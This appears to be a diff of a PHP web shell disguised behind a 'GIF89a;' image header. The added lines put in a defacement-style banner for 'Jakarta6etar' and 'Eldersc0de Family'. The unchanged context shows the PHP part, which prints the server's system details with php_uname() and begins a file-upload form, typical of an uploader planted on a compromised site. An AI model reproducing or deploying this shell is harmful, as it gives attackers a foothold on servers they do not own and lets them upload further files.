@@ -8,8 +8,40 @@
 
 GIF89a;
 <html>
-<body bgcolor="white">
-  <font color="green">
+<head>
+<title>Jakarta6etar</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link href='//fonts.googleapis.com/css?family=Fredoka+One' rel='stylesheet' type='text/css'>
+<link href='//fonts.googleapis.com/css?family=Share+Tech+Mono' rel='stylesheet' type='text/css'>
+<link href='//fonts.googleapis.com/css?family=Libre+Barcode+39+Extended+Text' rel='stylesheet' type='text/css'>
+<link href='//fonts.googleapis.com/css?family=Pompiere' rel='stylesheet' type='text/css'>
+<link rel="stylesheet" href="//zerobyte.id/styles.css">
+</head>
+  <Style>
+    .bground {
+    background-color: rgba(0, 30, 38, 0.7);
+    position: fixed;
+    z-index: -1;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+}
+div {
+    display: block;
+}
+    .footer {
+    font-family: 'Share Tech Mono';
+    font-size: 17px;
+    text-align: center;
+}
+    </style>
+<body>
+    <div class="bground"></div>
+    <h1>Jakarta6etar</h1>
+    </center><br>
+    <div class="footer">&copy; 2015 - 2018<br><span>Eldersc0de Family</span></div>
+</body>
 <?php 
 echo "<center>";
 echo "<br>"; echo "<b>".php_uname()."</font></b><br>"; echo "<form method='post' enctype='multipart/form-data'>
